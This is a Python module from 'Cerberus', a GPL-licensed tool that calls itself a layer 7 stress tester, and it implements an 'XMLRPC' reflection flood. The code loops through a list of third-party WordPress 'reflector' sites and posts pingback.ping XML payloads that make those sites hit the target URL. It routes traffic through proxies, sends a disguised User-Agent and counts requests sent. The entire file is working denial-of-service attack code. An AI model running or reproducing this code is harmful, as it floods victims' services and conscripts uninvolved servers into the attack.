'''

Cerberus, a layer 7 network stress testing tool that has a wide variety of normal and exotic attack vectors.
Copyright (C) 2022  Nexus/Nexuzzzz

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

'''

import time, requests

from src.core import Core
from src.utils import *
from src.useragent import *

pingback = ("<?xml version=\'1.0\' encoding=\'iso-8859-1\'?>"
            "<methodCall><methodName>pingback.ping</methodName>"
            "<params><param><value><string>{target}</string></value>"
            "</param><param><value><string>{reflector}/?p=1</string></value>"
            "</param></params></methodCall>")

def flood(attack_id, url, stoptime) -> None:
    if not Core.reflectors: return # no reflectors? just quit

    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue

        for reflector in list(Core.reflectors):
            payload = pingback.format(target=url, reflector=reflector)
        
            try:

                headers = {
                    'User-Agent': 'Internal Wordpress RPC connection',
                    'Content-Type': 'text/xml',
                    'Content-Length': str(len(payload))
                }

                Core.session.post(
                    reflector, 
                    headers=headers,
                    verify=False, 
                    timeout=(5,0.1), 
                    allow_redirects=False,
                    stream=False,
                    cert=None,
                    data=payload,
                    proxies=utils().get_proxy()
                )

                Core.infodict[attack_id]['req_sent'] += 1
            except requests.exceptions.ReadTimeout:
                Core.infodict[attack_id]['req_sent'] += 1

            except Exception:
                Core.infodict[attack_id]['req_fail'] += 1

            Core.infodict[attack_id]['req_total'] += 1
    Core.threadcount -= 1

Core.methods.update({
    'XMLRPC': {
        'info': 'Reflection attack abusing XML-RPC pingback endpoints',
        'func': flood
    }
})